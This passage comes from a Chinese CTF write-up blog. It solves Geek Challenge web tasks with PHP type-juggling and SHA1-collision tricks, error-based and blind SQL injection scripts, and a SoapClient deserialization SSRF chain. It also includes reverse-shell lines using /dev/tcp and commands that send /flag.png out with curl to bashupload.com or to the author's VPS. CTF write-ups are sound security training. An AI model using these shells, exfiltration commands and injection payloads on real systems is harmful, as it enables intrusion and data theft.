    $port = chijou_kega_no_junnka($data[<span class="hljs-string">&#x27;PORT&#x27;</span>]);
    exec(<span class="hljs-string">&quot;bash -c \&quot;bash -i &lt; /dev/tcp/<span class="hljs-subst">$addr</span>/<span class="hljs-subst">$port</span>\&quot;&quot;</span>);
&#125; <span class="hljs-keyword">else</span> &#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125;</code></pre></div>

<p>反弹shell，但是是个无回显的shell,可以无回显shell中执行反弹shell命令，再次反弹到VPS的另一个端口</p>
<p><code>bash -i &gt;&amp; /dev/tcp/IP/2233 0&gt;&amp;1</code></p>
<p>flag在<code>/flag.png</code>中</p>
<p>可以这样<code>curl bashupload.com -T /flag.png</code> </p>
<p><code>bashupload.com</code>是一个用来传输服务器文件的网站</p>
<p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111301202589.png" srcset="/img/loading.gif"><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111301203952.png" srcset="/img/loading.gif"></p>
<p>下载即可</p>
<ul>
<li>第二种方法<br>传到自己的服务器上<br><code>cat /flag.png &gt;&amp; /dev/tcp/IP/2233 0&gt;&amp;1</code></li>
</ul>
<p><code>nc -lvnp 2233 &gt; /var/flag.png</code></p>
<h2 id="Baby-PHP-Black-Magic-Enlightenment"><a href="#Baby-PHP-Black-Magic-Enlightenment" class="headerlink" title="Baby_PHP_Black_Magic_Enlightenment"></a>Baby_PHP_Black_Magic_Enlightenment</h2><p>第一关：</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PHP is the best Language &lt;br/&gt;&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have you ever heard about PHP Black Magic&lt;br/&gt;&quot;</span>;
error_reporting(<span class="hljs-number">0</span>);
$temp = $_GET[<span class="hljs-string">&#x27;password&#x27;</span>];
is_numeric($temp)?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no way&quot;</span>):<span class="hljs-literal">NULL</span>;    
<span class="hljs-keyword">if</span>($temp&gt;<span class="hljs-number">9999</span>)&#123;
    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&#x27;./2.php&#x27;</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;How&#x27;s that possible&quot;</span>;
&#125; 
highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-comment">//Art is long, but life is short. So I use PHP.</span>
<span class="hljs-comment">//I think It`s So useful that DiaoRen Said;</span>
<span class="hljs-comment">//why not they use their vps !!!</span>
<span class="hljs-comment">//BBTZ le jiarenmen</span>

<span class="hljs-meta">?&gt;</span></code></pre></div>
<p><code>/?password=10000a</code></p>
<p>第二关：</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);

$flag=getenv(<span class="hljs-string">&#x27;flag&#x27;</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>])) 
&#123;
    <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">&#x27;user&#x27;</span>] == $_GET[<span class="hljs-string">&#x27;pass&#x27;</span>])
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no no no no way for you to do so.&#x27;</span>;
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) === sha1($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>]))
      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;G1ve u the flag&#x27;</span>.$flag);
    <span class="hljs-keyword">else</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;not right&#x27;</span>;
&#125;
<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Just g1ve it a try.&#x27;</span>;
highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre></div>
<p><code>/baby_magic.php?user[]=1&amp;pass[]=2</code><br>第三关：</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);

$flag=getenv(<span class="hljs-string">&#x27;fllag&#x27;</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>])) 
&#123;
    <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">&#x27;user&#x27;</span>] == $_GET[<span class="hljs-string">&#x27;pass&#x27;</span>])
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no no no no way for you to do so.&#x27;</span>;
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(is_array($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) || is_array($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>]))
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;There is no way you can sneak me, young man!&#x27;</span>);
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) === sha1($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>]))&#123;
      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hanzo:It is impossible only the tribe of Shimada can controle the dragon&lt;br/&gt;&quot;</span>;
      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Genji:We will see again Hanzo&#x27;</span>.$flag.<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);
    &#125;
    <span class="hljs-keyword">else</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong!&#x27;</span>;
&#125;<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Just G1ve it a try.&#x27;</span>;
highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre></div>
<p>sha1哈希碰撞</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> urllib.request
rotimi = urllib.request.urlopen(<span class="hljs-string">&quot;http://shattered.io/static/shattered-1.pdf&quot;</span>).read()[:<span class="hljs-number">500</span>];
letmein = urllib.request.urlopen(<span class="hljs-string">&quot;http://shattered.io/static/shattered-2.pdf&quot;</span>).read()[:<span class="hljs-number">500</span>];
 
r = requests.get(<span class="hljs-string">&#x27;http://tc.rigelx.top:8003/baby_revenge.php&#x27;</span>, params=&#123;<span class="hljs-string">&#x27;user&#x27;</span>: rotimi, <span class="hljs-string">&#x27;pass&#x27;</span>: letmein&#125;);
print(r.text)
<span class="hljs-comment">#来自：https://www.linkedin.com/pulse/using-sha1-collision-attack-solve-bostonkeyparty-ctf-rotimi</span></code></pre></div>

<p>或者：<br>    ?user=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p>
<div class="hljs"><pre><code>&amp;pass=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></pre></div>
<p>第四关：</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag=getenv(<span class="hljs-string">&#x27;flllllllllag&#x27;</span>);
<span class="hljs-keyword">if</span>(strstr(<span class="hljs-string">&quot;Longlone&quot;</span>,$_GET[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;
  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;no no no!&lt;br&gt;&quot;</span>);
  <span class="hljs-keyword">exit</span>();
&#125;

$_GET[<span class="hljs-string">&#x27;id&#x27;</span>] = urldecode($_GET[<span class="hljs-string">&#x27;id&#x27;</span>]);
<span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>] === <span class="hljs-string">&quot;Longlone&quot;</span>)
&#123;
  
  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag: <span class="hljs-subst">$flag</span>&quot;</span>;
&#125;
highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre></div>
<p>url编码脚本</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$string = <span class="hljs-string">&#x27;Longlone&#x27;</span>; <span class="hljs-comment">//需要二次编码的字符或字符串</span>
$result = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($string);$i++)&#123;
    $char = $string[$i];
    <span class="hljs-keyword">for</span> ($ascii1 = <span class="hljs-number">0</span>; $ascii1 &lt; <span class="hljs-number">256</span>; $ascii1++) &#123;
        <span class="hljs-keyword">for</span> ($ascii2 = <span class="hljs-number">0</span>; $ascii2 &lt; <span class="hljs-number">256</span>; $ascii2++) &#123;
            $aaa = <span class="hljs-string">&#x27;%&#x27;</span>.$ascii1.<span class="hljs-string">&#x27;%&#x27;</span>.$ascii2;
            <span class="hljs-keyword">if</span>(urldecode(urldecode($aaa)) == $char)&#123;
                <span class="hljs-keyword">echo</span> $char.<span class="hljs-string">&#x27;: &#x27;</span>.$aaa;
                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
                $result = $result.$aaa;
                <span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;
            &#125;
        &#125;
    &#125;
&#125;
<span class="hljs-keyword">echo</span> $result;
<span class="hljs-meta">?&gt;</span></code></pre></div>
<p>payload:<code>?id=%4%43%6%46%6%45%6%37%6%43%6%46%6%45%6%35</code></p>
<h2 id="anothersql"><a href="#anothersql" class="headerlink" title="anothersql"></a>anothersql</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111302157152.png" srcset="/img/loading.gif"><br><code>floor报错注入</code><br>payload:<br>注库：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(schema_name) from information_schema.schemata),60))))a from information_schema.tables group by a)b#</code></p>
<div class="hljs"><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#a,fffaaakkkeeeflag,mysql,performance_schema,sys,true____flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre></div>
<p>注表：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;true____flag&#39;),60))))a from information_schema.tables group by a)b#</code></p>
<div class="hljs"><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#syclover&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre></div>
<p>注列：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;syclover&#39;),60))))a from information_schema.tables group by a)b#</code></p>
<div class="hljs"><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#id,uname,pwd,flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre></div>
<p>flag:<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(flag) from true____flag.syclover),60))))a from information_schema.tables group by a)b#</code></p>
<div class="hljs"><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#SYC&#123;U_4N0vv_3rR0r_Inj3c410n&#125;&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre></div>
<p><code>right函数</code></p>
<div class="hljs"><pre><code>mysql&gt; SELECT RIGHT(&#39;MySQL&#39;,3);
+------------------+
| RIGHT(&#39;MySQL&#39;,3) |
+------------------+
| SQL              |
+------------------+
1 row in set (0.00 sec)</code></pre></div>
<p><code>left函数</code></p>
<div class="hljs"><pre><code>mysql&gt; SELECT LEFT(&#39;MySQL LEFT&#39;, 5);
+-----------------------+
| LEFT(&#39;MySQL LEFT&#39;, 5) |
+-----------------------+
| MySQL                 |
+-----------------------+
1 row in set</code></pre></div>
<p><code>mid函数</code>—–和substr差不多</p>
<div class="hljs"><pre><code>mysql&gt; select mid(&#39;adbdab&#39;,3,2);
+-------------------+
| mid(&#39;adbdab&#39;,3,2) |
+-------------------+
| bd                |
+-------------------+
1 row in set (0.01 sec)</code></pre></div>
<p>substr被过了就用上面三个代替</p>
<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>bool盲注</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string

url=<span class="hljs-string">&#x27;http://47.100.242.70:4725/check.php&#x27;</span>
strr=string.printable
res=<span class="hljs-string">&#x27;&#x27;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):
    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> strr:
        <span class="hljs-comment">#payload=&quot;admi&#x27;or(mid(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)=&#x27;1&quot;.format(i,s)</span>
        <span class="hljs-comment">#payload=&quot;admi&#x27;or(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;easysql&#x27;)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)=&#x27;1&quot;.format(i,s)</span>
        <span class="hljs-comment">#payload=&quot;admi&#x27;or(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;syclover&#x27;)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)=&#x27;1&quot;.format(i,s)</span>
        payload=<span class="hljs-string">&quot;admi&#x27;or(mid((select(group_concat(pwd))from(easysql.syclover)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)=&#x27;1&quot;</span>.<span class="hljs-built_in">format</span>(i,s)
        <span class="hljs-comment">#print(payload)</span>
        data=&#123;<span class="hljs-string">&quot;uname&quot;</span>:payload,<span class="hljs-string">&quot;pwd&quot;</span>:<span class="hljs-string">&quot;adm&quot;</span>,<span class="hljs-string">&quot;wp-submit&quot;</span>:<span class="hljs-string">&quot;%E7%99%BB%E5%BD%95&quot;</span>&#125;
        r=requests.post(url,data)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrong password&#x27;</span> <span class="hljs-keyword">in</span> r.text:
            res+=s
            print(res)
            <span class="hljs-keyword">break</span></code></pre></div>
<p>空格过了用<code>()</code>,<code>substr</code>被过用<code>mid</code></p>
<h2 id="SoEzUnser"><a href="#SoEzUnser" class="headerlink" title="SoEzUnser"></a>SoEzUnser</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fxxk</span></span>&#123;
    <span class="hljs-keyword">public</span> $par0;
    <span class="hljs-keyword">public</span> $par1;
    <span class="hljs-keyword">public</span> $par2;
    <span class="hljs-keyword">public</span> $par3;
    <span class="hljs-keyword">public</span> $kelasi;
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$par0,$par1,$par2,$par3</span>)</span>&#123;
        <span class="hljs-keyword">$this</span> -&gt; par0 = $par0;
        <span class="hljs-keyword">$this</span> -&gt; par1 = $par1;
        <span class="hljs-keyword">$this</span> -&gt; par2 = $par2;
        <span class="hljs-keyword">$this</span> -&gt; par3 = $par3;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">newOne</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-keyword">$this</span> -&gt; kelasi = <span class="hljs-keyword">new</span> <span class="hljs-keyword">$this</span> -&gt; par0(<span class="hljs-keyword">$this</span> -&gt; par1,<span class="hljs-keyword">$this</span> -&gt; par2);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">wuhu</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;syclover    !&#x27;</span>.<span class="hljs-keyword">$this</span> -&gt; kelasi.<span class="hljs-string">&#x27;     yyds&#x27;</span>);
    &#125;
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">qifei</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-comment">//$ser = serialize($this -&gt; kelasi);</span>
        <span class="hljs-comment">//$unser = unserialize($ser);</span>
        <span class="hljs-keyword">$this</span> -&gt; kelasi -&gt; juts_a_function();
    &#125;
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span> -&gt; par0) &amp;&amp; (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span> -&gt; par1) || <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span> -&gt; par2)))&#123;
            <span class="hljs-keyword">$this</span> -&gt; newOne();
            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span> -&gt; par3 == <span class="hljs-string">&#x27;unser&#x27;</span>)&#123;
                <span class="hljs-keyword">$this</span> -&gt; qifei();
            &#125;
            <span class="hljs-keyword">else</span>&#123;
                <span class="hljs-keyword">$this</span> -&gt; wuhu();
            &#125;
        &#125;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
        @<span class="hljs-keyword">include_once</span>(<span class="hljs-keyword">$this</span> -&gt; par2.<span class="hljs-string">&#x27;hint.php&#x27;</span>);
    &#125;
&#125;
highlight_file(<span class="hljs-keyword">__FILE__</span>);
$hack = $_GET[<span class="hljs-string">&#x27;hack&#x27;</span>];
unserialize($hack);</code></pre></div>
<p>首先<code>__wakeup</code>里用伪协议读取<code>hint.php</code></p>
<p><code>$this-&gt;par2=php://filter/read=convert.base64-encode/resource=./</code></p>
<p><code>hint.php</code> </p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

$hint = <span class="hljs-string">&#x27;向管理员的页面post一个参数message(告诉他，&quot;iwantflag&quot;) 和 另一个参数 url（它会向这个url发送一个flag&#x27;</span>;
$hint .= <span class="hljs-string">&#x27;管理员的页面在当前目录下一个特殊文件夹里&#x27;</span>;
$hint .= <span class="hljs-string">&#x27;但是我不知道（你也猜不到的）文件夹名称和管理员页面的名称，更坏的消息是只能从127.0.0.1去访问，你能想个办法去看看（别扫 扫不出来!!!)&#x27;</span>;</code></pre></div>
<p>通过<code>newOne()</code>使用原生类<code>FilesystemIterator</code>读取目录</p>
<p>读取两次</p>
<p><code>/aaaaaaaaaaafxadwagaefae/UcantGuess.php</code></p>
<p>然后<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012339716.png" srcset="/img/loading.gif"><br>这个只能读一行，只有个<code>&lt;?php</code></p>
<p>接下来<code>SoapClient打SSRF</code></p>
<p>官方exp:</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fxxk</span></span>&#123;
<span class="hljs-keyword">public</span> $par0;
<span class="hljs-keyword">public</span> $par1;
<span class="hljs-keyword">public</span> $kelasi;
<span class="hljs-keyword">public</span> $par2;
<span class="hljs-keyword">public</span> $par3;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name,$par1,$par2,$par3</span>)</span>&#123;
<span class="hljs-keyword">$this</span> -&gt; par0 = $name;
<span class="hljs-keyword">$this</span> -&gt; par1 = $par1;
<span class="hljs-keyword">$this</span> -&gt; par2 = $par2;
<span class="hljs-keyword">$this</span> -&gt; par3 = $par3;
&#125;
&#125;
$postdata = <span class="hljs-string">&#x27;message=iwantflag&amp;url=http://vps:9999&#x27;</span>;
<span class="hljs-comment">//按要求设置post数据</span>
$url = <span class="hljs-string">&#x27;http://127.0.0.1/unserbucket/aaaaaaaaaaafxadwagaefae/UcantGuess.php&#x27;</span>;
<span class="hljs-comment">//payload1 = new fxxk(&#x27;&#x27;,&#x27;&#x27;,&#x27;php://filter/read=convert.base64-encode/resource=./&#x27;,&#x27;&#x27;);#伪协议读hint</span>
<span class="hljs-comment">//payload2 = new fxxk(&#x27;FilesystemIterator&#x27;,&#x27;./&#x27;,1,&#x27;echoo&#x27;);#列目录</span>
<span class="hljs-comment">//payload3 = new fxxk(&#x27;FilesystemIterator&#x27;,&#x27;./aaaaaaaaaaafxadwagaefae&#x27;,1,&#x27;echoo&#x27;);#列目录</span>
$payload4 = <span class="hljs-keyword">new</span> fxxk(<span class="hljs-string">&#x27;SoapClient&#x27;</span>,<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; $url,<span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt;
<span class="hljs-string">&#x27;wupco&#x27;</span>.<span class="hljs-string">&#x27;!!&#x27;</span>.<span class="hljs-string">&#x27;Content-Type:&#x27;</span>.<span class="hljs-string">&#x27;Application/X-WWW-Form-Urlencoded&#x27;</span>.<span class="hljs-string">&#x27;!!&#x27;</span>.<span class="hljs-string">&#x27;Content-Length:&#x27;</span>.(<span class="hljs-keyword">string</span>)strlen($postdata).<span class="hljs-string">&#x27;!!!!&#x27;</span>.$postdata.<span class="hljs-string">&#x27;!!&#x27;</span>,<span class="hljs-string">&#x27;uri&#x27;</span> =&gt;
<span class="hljs-string">&#x27;baaa&#x27;</span>),<span class="hljs-string">&#x27;unser&#x27;</span>);
$soa = str_replace(<span class="hljs-string">&#x27;!!&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,serialize($payload4));
<span class="hljs-keyword">echo</span>(urlencode($soa));</code></pre></div>
<p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112012348807.png" srcset="/img/loading.gif"></p>
<h2 id="validation"><a href="#validation" class="headerlink" title="validation"></a>validation</h2><p>验证码ocr</p>
<p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112020019531.png" srcset="/img/loading.gif"></p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
<span class="hljs-keyword">import</span> ddddocr
<span class="hljs-keyword">import</span> onnxruntime
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode

url = <span class="hljs-string">&quot;http://110.42.233.91:88/access&quot;</span>
sess = requests.Session()
ocr = ddddocr.DdddOcr(use_gpu=<span class="hljs-literal">True</span>)
onnxruntime.set_default_logger_severity(<span class="hljs-number">3</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pic_to_text</span>(<span class="hljs-params">text</span>):</span>
    img = re.findall(<span class="hljs-string">r&quot;base64,(.*?)&gt;&quot;</span>, text)[<span class="hljs-number">0</span>]
    <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;v_code_LA.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(b64decode(img.encode()))
    v_code = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;v_code_LA.png&quot;</span>)
    v_code.convert(<span class="hljs-string">&quot;L&quot;</span>)
    v_code.save(<span class="hljs-string">&quot;v_code.png&quot;</span>)
    v_code_bytes = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;v_code.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()
    code = ocr.classification(v_code_bytes)
    os.remove(<span class="hljs-string">&quot;v_code.png&quot;</span>)
    <span class="hljs-keyword">return</span> code.lower()


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">validate</span>(<span class="hljs-params">text</span>):</span>
    cnt = <span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">r&quot;done (.*?) times&quot;</span>, text)[<span class="hljs-number">0</span>])
    <span class="hljs-keyword">if</span> cnt == <span class="hljs-number">1000</span>:
        print(text)
        <span class="hljs-keyword">return</span>
    code = pic_to_text(text)
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(code) != <span class="hljs-number">4</span>:
        <span class="hljs-keyword">return</span>
    data = &#123;
        <span class="hljs-string">&quot;v_code&quot;</span>: code
    &#125;
    sess.post(url, data)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
        res = sess.get(url)
        validate(res.text)
        time.sleep(<span class="hljs-number">2</span>)</code></pre></div>

<p>不过这个脚本运行报错，等之后看看吧</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
                    
                      <a class="hover-with-bg" href="/categories/CTF/wp/">wp</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
                    
                      <a class="hover-with-bg" href="/tags/WP/">WP</a>
                    
                      <a class="hover-with-bg" href="/tags/geekchallenge/">geekchallenge</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/11/29/CVE-2021-41773/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CVE-2021-41773</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/11/16/HECTF/">
                        <span class="hidden-mobile">HECTF</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->




    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
